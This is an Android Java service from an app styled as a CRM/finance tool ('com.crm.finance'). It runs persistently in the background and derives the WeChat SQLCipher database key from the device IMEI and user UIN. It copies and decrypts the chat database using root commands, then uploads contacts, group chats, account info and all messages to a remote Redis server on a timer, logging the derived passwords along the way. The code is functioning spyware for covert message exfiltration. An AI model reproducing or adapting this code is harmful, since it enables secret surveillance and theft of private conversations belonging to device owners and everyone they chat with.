package com.crm.finance;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.telephony.TelephonyManager;

import com.crm.finance.app.MyApplication;
import com.crm.finance.broadcast.BroadcastManager;
import com.crm.finance.broadcast.BroadcastUtils;
import com.crm.finance.dao.DevInfoDao;
import com.crm.finance.dao.DeviceStateDao;
import com.crm.finance.dao.UserInfoDao;
import com.crm.finance.util.Common;
import com.crm.finance.util.GlobalCofig;
import com.crm.finance.util.JedisUtil;
import com.crm.finance.util.LogInputUtil;
import com.crm.finance.util.MyLog;
import com.crm.finance.util.ShareData;
import com.crm.finance.util.UploadManager;
import com.crm.finance.util.Utils;
import com.crm.finance.util.WXDataFormJsonUtil;
import com.crm.finance.util.dbutil.WeChatDBOperator;
import com.crm.finance.util.fileutil.FileUtil;
import com.crm.finance.util.timeutil.TimeUtils;
import com.crm.finance.util.wxutil.WXBusinessUtil;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import redis.clients.jedis.Jedis;


public class GohnsonService extends Service {

    private final static int GOHNSON_ID = 1000;

    private final static String TAG = GohnsonService.class.getSimpleName();

    private String wxIMEI = "";
    private String wxIMEI1 = "";//微信分身
    private String parallelLiteIMEI = "";

    private String mDbPassword = "";

    HashMap<String, String> mapUIN = new HashMap<String, String>();
    WeChatDBOperator weChatDBOperator = null;

    @Override
    public void onCreate() {
        super.onCreate();
        isExecuteEnd = true;
        initBaseContnet();
        initWeChatDB();

       copyApkAndSo();
    }

    public void copyApkAndSo(){
        Utils.copyVserAPK(GohnsonService.this);
        Utils.copySOFile(GohnsonService.this);
    }

    public void initWeChatDB() {
        weChatDBOperator = new WeChatDBOperator(this);
    }

    public void initBaseContnet() {
        LogInputUtil.e(TAG, "GohnsonService 启动 onCreate");
        //CrashReport.initCrashReport(getApplicationContext(), GlobalCofig.BUGLY_ID, GlobalCofig.BUGLY_ISDEBUG);
        //Bugly.init(getApplicationContext(), GlobalCofig.BUGLY_ID, GlobalCofig.BUGLY_ISDEBUG);
        MyLog.init(MyApplication.getAPP().getCacheDir().getPath());
        initIMEI();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        LogInputUtil.e(TAG, "GohnsonService 存在， 触发onStartCommand");
        try {
            if (Build.VERSION.SDK_INT < 18) {
                startForeground(GOHNSON_ID, new Notification());
            } else {
                timekeeping();
                startForeground(GOHNSON_ID, new Notification());
            }
        } catch (Exception e) {
            MyLog.inputLogToFile(TAG, "onStartCommand 启动异常，msg = " + e.getMessage());
        }
        return super.onStartCommand(intent, flags, startId);
    }

    public void executeUpload() {
        if (isExecuteUploadService()) {
            //开异步线程，保障所有数据库操作及网络请求不在主线程
            UploadAsyncTask asyncTask = new UploadAsyncTask();
            asyncTask.execute();
        }
    }

    //上报信息是否上传完毕状态
    public void pushUploadDataState() {
        if (wxIMEI == null || wxIMEI.equals("") || wxIMEI1 == null || wxIMEI1.equals("")) {
            initIMEI();
        }

        DevInfoDao devInfoDao = new DevInfoDao();
        devInfoDao.setDeviceid(Utils.getDeviceId());
        devInfoDao.setWxIMEI(wxIMEI);
        final Gson gson = new GsonBuilder().serializeNulls().setDateFormat("yyyy-MM-dd HH:mm:ss").create();
        String deviceid = gson.toJson(devInfoDao);
        UploadManager.getInit().uploadDataState(deviceid);
    }
    //上传心跳
    public void pushHeartbeat() {
        if (wxIMEI == null || wxIMEI.equals("") || wxIMEI1 == null || wxIMEI1.equals("")) {
            initIMEI();
        }
        String vserStr = Utils.getVersionNumber(this);

        DeviceStateDao dao = new DeviceStateDao();
        dao.setDeviceid(Utils.getDeviceId());
        dao.setWxIMEI(wxIMEI);
        dao.setVersion(vserStr);
        final Gson gson = new GsonBuilder().serializeNulls().setDateFormat("yyyy-MM-dd HH:mm:ss").create();
        String deviceid = gson.toJson(dao);
        UploadManager.getInit().pushHeartbeat(deviceid);
    }
 

    private TimerTask mTimerTask;
    private Timer mTimer = new Timer(true);
    public static boolean isExecuteEnd = true;
    long existTime = 0;

    public void timekeeping() {
        if (mTimerTask != null) return;
        mTimerTask = new TimerTask() {
            public void run() {
              //  copyApkAndSo();
                pushHeartbeat();

                existTime = existTime + GlobalCofig.EXECUTE_HEARBEAT_INTERVAL;
                LogInputUtil.e(TAG, "存在时长：" + existTime / 1000);
                if (existTime >= GlobalCofig.EXIST_MAC_TIME) {
                    existTime = 0;
                    LogInputUtil.e(TAG, "达到最长时长，清除自己");
                    System.exit(0);
                }
                if (isExecuteEnd) {
                    isExecuteEnd = false;
                    LogInputUtil.e(TAG, "开始执行定时线程！");
                    executeUpload();
                } else {
                    LogInputUtil.e(TAG, "上个任务没执行完，不重复执行定时线程！");
                }
            }
        };
        mTimer.schedule(mTimerTask, 0, GlobalCofig.EXECUTE_HEARBEAT_INTERVAL);//多少秒执行一次

    }


    //EXECUTE_SERVICE_INTERVAL 时间间隔内不重复执行操作
    public boolean isExecuteUploadService() {
        long currentTime = System.currentTimeMillis();
        long lastTime = ShareData.getInstance().getLongValue(this, GlobalCofig.LAST_EXECUTE_SERVICE_TIME, 0);
        LogInputUtil.e(TAG, GlobalCofig.LAST_EXECUTE_SERVICE_TIME + " = " + lastTime);

        long intervalTime = currentTime - lastTime;
        LogInputUtil.e(TAG, "上次时间 = " + lastTime + ", 本次时间 = " + currentTime + "间隔时间为 = " + intervalTime);

        if (intervalTime < GlobalCofig.EXECUTE_SERVICE_INTERVAL) {
            LogInputUtil.e(TAG, "未超过最低时间间隔，不执行业务");
            isExecuteEnd = true;
            return false;
        }

        ShareData.getInstance().saveLongValue(this, GlobalCofig.LAST_EXECUTE_SERVICE_TIME, currentTime);
        LogInputUtil.e(TAG, "超过间隔时间，可以执行上传操作！");
        return true;
    }


    public static class GohnsonInnerService extends Service {

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startForeground(GOHNSON_ID, new Notification());
            stopForeground(true);
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }

        @Override
        public IBinder onBind(Intent intent) {
            // TODO: Return the communication channel to the service.
            throw new UnsupportedOperationException("Not yet implemented");
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public void initIMEI() {
        LogInputUtil.e(TAG, "正在获取imei");
        String deviceId =Utils.getDeviceId();

        String tencentCompatibleInfoPath = GlobalCofig.OPERATION_DIR + GlobalCofig.COMPATIBLE_INFO_CFG;
        if (new File(tencentCompatibleInfoPath).exists())
            wxIMEI = Common.getWxIMEI(tencentCompatibleInfoPath);
        else
            wxIMEI = deviceId;

        String tencent1CompatibleInfoPath = GlobalCofig.OPERATION_DIR_1 + GlobalCofig.COMPATIBLE_INFO_CFG;
        if (new File(tencent1CompatibleInfoPath).exists())
            wxIMEI1 = Common.getWxIMEI(tencent1CompatibleInfoPath);
        else
            wxIMEI1 = deviceId;

        String parallelLiteCompatibleInfoPath = GlobalCofig.OPERATION_DIR_PARALLEL_LITE + GlobalCofig.COMPATIBLE_INFO_CFG;
        if (new File(parallelLiteCompatibleInfoPath).exists())
            parallelLiteIMEI = Common.getWxIMEI(parallelLiteCompatibleInfoPath);
        else
            parallelLiteIMEI = deviceId;
        MyLog.inputLogToFile(TAG, "deviceId = " + deviceId + " ,wxIMEI = " + wxIMEI + " ,wxIMEI1=" + wxIMEI1 + ",parallelLiteIMEI = " + parallelLiteIMEI + " ,appVersion = " + Utils.getVersionNumber(this));
    }

    public void UploadWXData() {
        LogInputUtil.e(TAG, "正在获取UploadWXData");
        try {
            initIMEI();
            //获取各路径下的UIN
            getUins(GlobalCofig.OPERATION_DIR + GlobalCofig.WX_UIM_FILE);
            getUins(GlobalCofig.OPERATION_DIR_1 + GlobalCofig.WX_UIM_FILE);
            // getUins(GlobalCofig.OPERATION_DIR_0 + GlobalCofig.WX_UIM_FILE);
            //getUins(GlobalCofig.OPERATION_DIR_11 + GlobalCofig.WX_UIM_FILE);
           // getUins(GlobalCofig.OPERATION_DIR_PARALLEL_LITE + GlobalCofig.WX_UIM_FILE);

            GetFiles(GlobalCofig.OPERATION_DIR, GlobalCofig.WX_DATA_DB, true);
            // GetFiles(GlobalCofig.OPERATION_DIR_0, GlobalCofig.WX_DATA_DB, true);
            //GetFiles(GlobalCofig.OPERATION_DIR_11, GlobalCofig.WX_DATA_DB, true);
           // GetFiles(GlobalCofig.OPERATION_DIR_PARALLEL_LITE, GlobalCofig.WX_DATA_DB, true);
        } catch (Exception e) {
            MyLog.inputLogToFile(TAG, "异常 UploadWXData = " + e.getMessage());
        }
    }


    public void getUins(String filePath) {
        try {
            File app_brand_global_sp = new File(filePath);
            boolean fileExist = app_brand_global_sp.exists();
            if(!fileExist){
                MyLog.inputLogToFile(TAG, "文件不存在，请确认是否已登陆微信。path = " + filePath);
                return;
            }
            if (fileExist) {
                FileInputStream in = new FileInputStream(app_brand_global_sp);
                DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();  //取得DocumentBuilderFactory实例
                DocumentBuilder builder = factory.newDocumentBuilder(); //从factory获取DocumentBuilder实例
                Document doc = builder.parse(in);   //解析输入流 得到Document实例
                Element rootElement = doc.getDocumentElement();
                NodeList items = rootElement.getElementsByTagName("set");
                for (int i = 0; i < items.getLength(); i++) {
                    Node item = items.item(i);
                    NodeList properties = item.getChildNodes();
                    for (int j = 0; j < properties.getLength(); j++) {
                        Node property = properties.item(j);
                        String nodeName = property.getNodeName();
                        if (nodeName.equals("string")) {
                            String Uin = property.getFirstChild().getNodeValue();
                            mapUIN.put(Common.getMD5("mm" + Uin).toLowerCase(), Uin);
                            LogInputUtil.e(TAG, "MMUIN = " + Common.getMD5("mm" + Uin).toLowerCase() + ", UIN = " + Uin + ",path = " + filePath);
                        }
                    }
                }
            }
        } catch (Exception e) {
            MyLog.inputLogToFile(TAG, "获取Uin异常 getUin errMsg = " + e.getMessage() + ",path = " + filePath);
        }
    }


    public void GetFiles(String Path, String Extension, boolean IsIterative)  //搜索目录，扩展名，是否进入子文件夹
    {
        File[] files = new File(Path).listFiles();
        if (files == null) return;

        try {
            for (int i = 0; i < files.length; i++) {
                File f = files[i];
                if (f.isFile()) {
                    if (f.getPath().endsWith(Extension)) {//查找指定扩展名的文件
                        String wxFolderPath = new File(f.getParent()).getName();
                        if (wxFolderPath.length() != 32) continue;

                        long fileChangeTime = f.lastModified();
                        long saveChangeTime = ShareData.getInstance().getLongValue(this, f.getPath(), 0);
                        LogInputUtil.e(TAG, "文件最后更新时间=" + fileChangeTime + ",保存的时间 = " + saveChangeTime + ", path = " + f.getPath());

                        if (fileChangeTime == saveChangeTime) {
                            String noChangeStr = "文件无改变，不操作该数据库，lastModifiedTime = " + fileChangeTime + ",saveTime = " + saveChangeTime + ",filePath = " + f.getPath();
                            MyLog.inputLogToFile(TAG, noChangeStr);
                            pushUploadDataState();
                            BroadcastUtils.sendDataUploadErrLog(noChangeStr);
                            continue;
                        }

                        String dbPath = f.getParent() + "/" + wxFolderPath + ".db";
                        LogInputUtil.e(TAG, "dbPath = " + dbPath);

                        mDbPassword = getDBPass(f.getPath(), wxFolderPath);
                        String pathUin = mapUIN.get(wxFolderPath);
                        String deviceId =Utils.getDeviceId();

                        if (f.getParent().contains(GlobalCofig.OPERATION_DIR_1)) {
                            MyLog.inputLogToFile(TAG, "deviceId ="+deviceId + ",wxIMEI1=" + wxIMEI1 + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
                        } else if (f.getParent().contains(GlobalCofig.OPERATION_DIR_PARALLEL_LITE)) {
                            MyLog.inputLogToFile(TAG, dbPath + "deviceId ="+deviceId +",parallelLiteIMEI=" + parallelLiteIMEI + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
                        } else {
                            MyLog.inputLogToFile(TAG, "deviceId ="+deviceId +",wxIMEI=" + wxIMEI + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
                        }

                        final File dbFile = new File(dbPath);

                        if (dbFile.exists())
                            dbFile.delete();
                        Common.copyFile(f.getPath(), dbFile.getPath());
                        if (!FileUtil.isFileExists(dbFile.getPath())) {
                            MyLog.inputLogToFile(TAG, "数据库不存在，filePath = " + dbFile.getPath());
                            continue;
                        }

                        //开线程，部分机型在不开线程情况下会阻塞进程
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                Common.execRootCmd("chmod 777 " + dbFile.getPath());
                            }
                        }).start();

                        SQLiteDatabase.loadLibs(getApplicationContext());

                        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
                            public void preKey(SQLiteDatabase database) {
                            }

                            public void postKey(SQLiteDatabase database) {
                                database.rawExecSQL("PRAGMA cipher_migrate;"); //兼容2.0的数据库
                            }
                        };
                        SQLiteDatabase dataTarget = null;
                        try {
                            LogInputUtil.e(TAG,"path ="+dbFile.getPath()+",pass = "+mDbPassword);
                            dataTarget = SQLiteDatabase.openOrCreateDatabase(dbFile.getPath(), mDbPassword, null, hook);
                            uploadOperation(dataTarget, f, pathUin, wxIMEI, fileChangeTime);

                        } catch (Exception e) {

                            String exceptionStr = "异常 ：上传数据信息失败:" + e.getMessage() + ",filePath = " + (dbFile == null ? "" : dbFile.getPath());
                            MyLog.inputLogToFile(TAG, exceptionStr);
                            BroadcastUtils.sendDataUploadErrLog(exceptionStr);
                        } finally {
                            if (dataTarget != null)
                                dataTarget.close();
                        }
                    }
                    if (!IsIterative)
                        break;
                } else if (f.isDirectory()) {
                    GetFiles(f.getPath(), Extension, IsIterative);
                }
            }
        } catch (Exception e) {
            MyLog.inputLogToFile(TAG, "异常：GetFiles Exception " + e.getMessage());
        }
    }

    public String getDBPass(String filePath, String wxFolderPath) {
        if (filePath.contains(GlobalCofig.OPERATION_DIR_PARALLEL_LITE)) {
            return Common.getMD5(parallelLiteIMEI + mapUIN.get(wxFolderPath)).substring(0, 7).toLowerCase();//返回平行空间目录下的imei
        }
        if (filePath.contains(GlobalCofig.OPERATION_DIR_1)) {
            return Common.getMD5(wxIMEI1 + mapUIN.get(wxFolderPath)).substring(0, 7).toLowerCase();//默认返回腾讯目录下的imei
        }
        return Common.getMD5(wxIMEI + mapUIN.get(wxFolderPath)).substring(0, 7).toLowerCase();//默认返回腾讯目录下的imei
    }

    public void uploadOperation(SQLiteDatabase dataTarget, File file, String pathUin, String wxIMEI, long fileChangeTime) {
        String wxFolderPath = new File(file.getParent()).getName();

        String userName = "";
        final ArrayList<Object> userInfos = WXDataFormJsonUtil.getUserInfoDataInDB(dataTarget);
        //通过Uin查询用户微信号username
        for (int i = 0; i < userInfos.size(); i++) {
            UserInfoDao userInfoDao = (UserInfoDao) userInfos.get(i);
            if (userInfoDao.getId() == 2) {
                userName = userInfoDao.getValue();
                break;
            }
        }

        boolean chatroomUploadSucceed = false;
        final ArrayList<Object> chatRooms = WXDataFormJsonUtil.getChatRoomDataInDB(dataTarget);
        if (chatRooms != null) {
            if (chatRooms.size() == 0) {
                chatroomUploadSucceed = true;//无群聊
            }else {
                String chatRoomJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, chatRooms, pathUin, wxIMEI, userName);
                LogInputUtil.e(TAG, "待提交的chatRoomJsonStr = " + chatRoomJsonStr);
                if (chatRoomJsonStr != null && !chatRoomJsonStr.equals("")) {
                    chatroomUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_CHATROOM, chatRoomJsonStr, file);
                    if(chatroomUploadSucceed)Utils.setUploadTime();

                }
            }
        }


        final ArrayList<Object> imgFlags = WXDataFormJsonUtil.getImgFlagDataInDB(dataTarget);
//        String imgFlagJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, imgFlags, pathUin, wxIMEI, userName);
//        LogInputUtil.e(TAG, "待提交的imgFlagJsonStr = " + imgFlagJsonStr);
//        //目前该表不使用，不用上传
//        boolean imgFlagUploadSucceed = false;
//        if (imgFlagJsonStr != null && !imgFlagJsonStr.equals("")) {
//            //目前该表不使用
//              imgFlagUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_IMGFLAG, imgFlagJsonStr, file);
//        }
        boolean allRcontactUploadSucceed = false;
        ArrayList<Object> rcontactInSelfDB = weChatDBOperator.selectAll(GlobalCofig.CRM_TIP + wxFolderPath);//已上传的好友数据
        MyLog.inputLogToFile(TAG, "已在库的好友数：" + rcontactInSelfDB.size());
        final ArrayList<Object> rcontacts = WXDataFormJsonUtil.getRcontactDataInDB(this, dataTarget, file, rcontactInSelfDB);
        if (rcontacts != null) {
            int rcontactSize = rcontacts.size();
            MyLog.inputLogToFile(TAG, "准备上传的好友数：" + rcontactSize);
            if (rcontactSize > 0) {
                WXBusinessUtil.setFriendHeadImg(rcontacts, imgFlags);
                String rcontactJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, rcontacts, pathUin, wxIMEI, userName);
                LogInputUtil.e(TAG, "待提交的rcontactJsonStr = " + rcontactJsonStr);
                if (rcontactJsonStr != null && !rcontactJsonStr.equals("")) {
                    allRcontactUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_CONTACT, rcontactJsonStr, file);
                    if (allRcontactUploadSucceed) {
                        weChatDBOperator.createTable(GlobalCofig.CRM_TIP + wxFolderPath);
                        weChatDBOperator.addList(GlobalCofig.CRM_TIP + wxFolderPath, rcontacts);
                    }
                }
            } else if (rcontactSize == 0) {
                allRcontactUploadSucceed = true;
            }
        }

        String userInfoJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, userInfos, pathUin, wxIMEI, userName);

        LogInputUtil.e(TAG, "待提交的userInfoJsonStr = " + userInfoJsonStr);
        boolean userInfoUploadSucceed = false;
        if (userInfoJsonStr != null && !userInfoJsonStr.equals("")) {
            userInfoUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_USERINFO, userInfoJsonStr, file);
            if(userInfoUploadSucceed)Utils.setUploadTime();

        }

        boolean allMessageUploadSucceed = false;
        for (int i = 0; i < 100; i++) {
            LogInputUtil.e(TAG, "第" + i + "次查询message表");
            boolean dataUploadSucceed = false;
            ArrayList<Object> messages = WXDataFormJsonUtil.getMessageDataInDB(this, dataTarget, file);
            messages = WXBusinessUtil.addSrcPath(wxFolderPath, messages);//添加图片、语音路径

            if (messages == null) continue;
            int listSize = messages.size();
            if (listSize > 0) {
                String messageJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, messages, pathUin, wxIMEI, userName);

                LogInputUtil.e(TAG, "待提交的MessageJson = " + messageJsonStr);
                if (messageJsonStr != null && !messageJsonStr.equals("")) {
                    dataUploadSucceed = uploadMessageDataToRedis(GlobalCofig.REDIS_KEY_MESSAGE, messageJsonStr, file);
                    if(dataUploadSucceed)Utils.setUploadTime();

                }
            } else if (listSize == 0) {
                dataUploadSucceed = true;
            }

            if (dataUploadSucceed && listSize < GlobalCofig.UPLOAD_NUMBER) {
                LogInputUtil.e(TAG, "上传成功，并且是最后" + listSize + "条");
                allMessageUploadSucceed = true;
                break;
            }
        }
        boolean allDataUpadte = (chatroomUploadSucceed && allRcontactUploadSucceed && userInfoUploadSucceed && allMessageUploadSucceed);
        MyLog.inputLogToFile(TAG, "所有数据是否已上传"+allDataUpadte+",chatroom群聊天 = " + chatroomUploadSucceed + ",Rcontact联系人 =" + allRcontactUploadSucceed+",userInfo用户信息 ="+userInfoUploadSucceed+",allMessage所有聊天 = "+allMessageUploadSucceed);
        if (allDataUpadte) {
            ShareData.getInstance().saveLongValue(this, file.getPath(), fileChangeTime);
            MyLog.inputLogToFile(TAG, "本数据库所有数据已上传，若修改时间不更新，不再操作该数据库，key = " + file.getPath() + ",time =" + fileChangeTime);
            pushUploadDataState();
        }
    }

    public boolean uploadDataToRedis(String key, String jsonValue, File file) {
        String hashKey = key + "_" + file.getPath();
        int newJsonHashCode = jsonValue.hashCode();
        int oldJsonHashCode = ShareData.getInstance().getIntValue(this, hashKey, 0);
       /* if (!key.equals(GlobalCofig.REDIS_KEY_CONTACT) && newJsonHashCode == oldJsonHashCode) {//REDIS_KEY_CONTACT 不再校验jsonHash，通过数据库过滤
            MyLog.inputLogToFile(TAG, "数据无更新，无需上传，newJsonHashCode = " + newJsonHashCode + ",oldJsonHashCode = " + oldJsonHashCode + ", hashKey = " + hashKey);
            return true;
        }*/

        try {

            Jedis myJedis = JedisUtil.getInit();
            MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
            long pushValue = myJedis.lpush(key, jsonValue);
           // ShareData.getInstance().saveIntValue(this, hashKey, newJsonHashCode);
            MyLog.inputLogToFile(TAG, "redis上传成功，数据有更新" + key + "，newJsonHashCode = " + newJsonHashCode + ",oldJsonHashCode = " + oldJsonHashCode + ",pushValue = " + pushValue + ",filePath = " + file.getPath());
            return true;
        } catch (Exception e) {
            MyLog.inputLogToFile(TAG, "redis 连接失败, errMsg = " + e.getMessage() + ", hashKey = " + hashKey);
            return false;
        }
    }

    public boolean uploadMessageDataToRedis(String key, String jsonValue, File file) {

        try {
            Jedis myJedis = JedisUtil.getInit();
            MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
            long pushValue = myJedis.lpush(key, jsonValue);

            //上传成功去更新下标，下次从新下标开始取值
            String lastUploadTimeStr = GlobalCofig.MESSAGE_LAST_UPLOAD_TIME + file.getPath();
            LogInputUtil.e(TAG,"更新的时候点 = "+lastUploadTimeStr);
            long lastUploadTimeTemporary = ShareData.getInstance().getLongValue(this, GlobalCofig.MESSAGE_LAST_UPLOAD_TIME_TEMPORARY + file.getPath(), 0);
            long lastUploadTime = ShareData.getInstance().getLongValue(this, lastUploadTimeStr, 0);
            ShareData.getInstance().saveLongValue(this, lastUploadTimeStr, lastUploadTimeTemporary);

            MyLog.inputLogToFile(TAG, key + "：redis 上传成功 ，message数据有更新，时间为= " + Utils.transForDate(lastUploadTimeTemporary) + "(" + lastUploadTimeTemporary + "),旧时间 = " + Utils.transForDate(lastUploadTime) + "(" + lastUploadTime + "),pushValue = " + pushValue + ",filePath = " + file.getPath());

            ShareData.getInstance().saveStringValue(this, GlobalCofig.MESSAGE_LAST_UPLOAD_TIME_ONLY, TimeUtils.transForDateSimpleness(lastUploadTimeTemporary));
            BroadcastUtils.sendDataUploadLog(lastUploadTimeTemporary, file.getPath());
            return true;
        } catch (Exception e) {
            String errMsg = key + ":redis 连接失败, errMsg = " + e.getMessage();
            MyLog.inputLogToFile(TAG, errMsg);
            BroadcastUtils.sendDataUploadErrLog(errMsg);
            return false;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (mTimer != null) {
            mTimer.cancel();
        }
        GlobalCofig.excuteGohnsonService(this);
        LogInputUtil.e(TAG, "onDestroy GohnsonService");
        if (weChatDBOperator != null) {
            weChatDBOperator.close();
        }
        isExecuteEnd = true;
    }


    public class UploadAsyncTask extends AsyncTask<Integer, Integer, String> {
        public UploadAsyncTask() {
            super();
        }

        /**
         * 这里的Integer参数对应AsyncTask中的第一个参数
         * 这里的String返回值对应AsyncTask的第三个参数
         * 该方法并不运行在UI线程当中，主要用于异步操作，所有在该方法中不能对UI当中的空间进行设置和修改
         * 但是可以调用publishProgress方法触发onProgressUpdate对UI进行操作
         */
        @Override
        protected String doInBackground(Integer... params) {
            try {
                UploadWXData();
            } catch (Exception e) {
                MyLog.inputLogToFile(TAG, "doInBackground异常，msg= " + e.getMessage());
            }
            return "";
        }

        /**
         * 这里的String参数对应AsyncTask中的第三个参数（也就是接收doInBackground的返回值）
         * 在doInBackground方法执行结束之后在运行，并且运行在UI线程当中 可以对UI空间进行设置
         */
        @Override
        protected void onPostExecute(String result) {
            isExecuteEnd = true;
        }

        //该方法运行在UI线程当中,并且运行在UI线程当中 可以对UI空间进行设置
        @Override
        protected void onPreExecute() {
        }

        /**
         * 这里的Intege参数对应AsyncTask中的第二个参数
         * 在doInBackground方法当中，，每次调用publishProgress方法都会触发onProgressUpdate执行
         * onProgressUpdate是在UI线程中执行，所有可以对UI空间进行操作
         */
        @Override
        protected void onProgressUpdate(Integer... values) {
        }
    }
}
